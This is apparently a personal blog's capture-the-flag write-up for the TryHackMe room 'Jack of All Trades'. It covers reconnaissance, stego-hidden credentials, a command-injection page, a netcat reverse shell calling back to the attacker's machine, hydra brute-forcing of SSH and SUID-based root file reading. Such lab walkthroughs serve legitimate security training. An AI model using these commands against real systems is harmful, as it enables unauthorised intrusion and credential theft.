---
title: THM Jack of All Trades
date: 2021-01-23 14:30:00 +0000
categories: [Security, TryHackMe]
tags: [thm, jack, writeup]     # TAG names should always be lowercase
---

Introduction
Not a lot of information inside this room. So let's use standard way of discovering.

Reconnaissance
Use nmap to analyse the deployed room
nmap -sV -O <ip> -v

Have a detailled look on the answer because there is something special inside the result.
OpenSSH is deployed on port 80
Apache is deployed on port 22

Use your browser to connect on the apache service on port 22.
At least with Firefox, you will encountered an issue to connect on port 22 because this is a restricted port and Firefox block the access.

To force the connection, you can follow this step
Open a new firefox tab and type about:config in the address bar.
Try to found the following key : network.security.ports.banned.override
If it exist, you can change the value to have port 22 on it.
If it is not existing you can create a new value inside this page, right click anywhere on the page and choose New > String
Paste the value name inside the dialog box : network.security.ports.banned.override
In the port number dialog box, choose 22.

Then retry your access to the website on port 22 and it should work.

We found a - normal - website with some text inside. Notinh to exploit at first view, continue the reconnaissance.
Check source code
We found an interresting information inside. Let's have a look after and continue reconnaissance.
Check web delovopment tools (network, console, ...)
We found another interresting stuff with an image named stego. Put away this information, we will maybe need it after.
Analyze the website with gobuster to found potential other information.
gobuster dir -u <ip> -w /usr/share/wordlists/dirb/big.txt
Nothing found on this way.

During the analysis go back to the information found inside the source code.
Go the /recovery.php path.
We found a login page with user/password.
Below, we have a very very long string (UmVtZ[...]xCg==)... Let's analyze it to found what is behind. You can use CyberChef to identify what is the hidden value.
As it is finishing by == it is probably a base64 encoding value. Let's use a "From Base64" recipe to decode the string. 
And here we are, we found interresting information with a password.

Observe /recovery.php source code page to found another encoding value (GQ2TO[...]DINQ=).
Let's identify the type now. Base64 is not working, let's try other baseXX.
Base32 provide something which seems to be hexadecimal. Let's add another transformation "From Hex".
The result is not understandable but looks like a valid entropy with a score of 4.43 (Standard EZnglish is usually somewhere between 3.5 and 5).
Let's try another transofrmation with ROT13.
Here we are, we found the information hidden inside the value. It said that the information about the login name is hidden inside the homepage. 
We also have a little hint with a link to Stegosauria's wikipedia. This should be link to the stego file we discover at the begining.

Let's start an steganograpy analysis of the stego.png file.
Download the file and start the analysis with steghide
steghide extract -sf stego.jpg
Steghide is requested a passphrase. Let's use the one we found inside the first encoding value. It works and extracted data are available inside creds.txt.
Let's open the file
cat creds.txt
Bad news! No login information but the message says that we are on the right path. Let's try another image of the home page.

There is two other image in the homepage (header.jpg & jackinthebox.jpg). Analyze both with steghide again.
steghide extract -sf jackinthebox.jpg
Enter previous passphrase
No result.

steghide extract -sf header.jpg
Enter previous passphrase
Here we have a result. Data are extracted to cms.creds. Open the file.
cat cms.creds

Let's use this information on the recovery.php page.

Login/password works well and redirect us to a secret path (nn[..]OV/index.php)
Login page show the following text:
GET me a 'cmd' and I'll run it for you Future-Jack
What does it means ?
My first understanding is that we can use this page with a GET parameter to receive the answer. Let's try something simple to start:
curl GET <ip>:22/nn[..]OV/index.php?cmd=whoami
And we have the result of whoami command inside the Response page..

Let's try a path traversal attack
curl GET <ip>:22/nn[..]OV/index.php?cmd=cat ../../../../../../../etc/password
We have the result but nothing to exploit except that a user named jackhave access to the machine (obvious because we found the signature Jack inside the website)

Let's try to open a reverse shell to have a better access on the webserver.
On the attack machine, start a listener with
nc -nvlp 1234
Then execute the following web request to execute the reverse shell
curl GET <target_ip>:22/nn[..]OV/index.php?cmd=nc -e /bin/sh <attack_ip> <port_attack_ip>
Here we have our reverse shell.
Let's try to found a way to change user to jack.

Navigate inside the machine and then we found an interresting file named 'jack's_password_list' inside /home which is read access to everybody. 
Let's use this list to bruteforce the ssh access of jack user with hydra.
hydra -l jack -P jacks_password_list.txt -s 80 <ip> ssh
Remember that SSH port is on port 80 (instead of 22 usualy).

And hydra found the good password. Let's open the SSH connection with jack
ssh jack@<ip>
Enter password found by hydra

and we found an image file inside /home/jack. Try to open it to found a flag inside the recipe :)

Privilege Escalation
Before using an enumeration script like LinEnum, I always check some basic privilege escalation like the follow:
sudo -l
Nothing to see here.

Search for SUID files
find / -perm /4000 2>/dev/null
perm 4000 allow us to search file with SUID bit set.
Here we have some interesting answer. Let's compare the output of the command with the list available at https://gtfobins.github.io/
We found that strings executable could be used to read files as root when SUID bit is set on the binary.
so let's try with a basic file /root/root.txt (usualy the flag is here).
strings /root/root.txt
Bingo, we found the root flag.
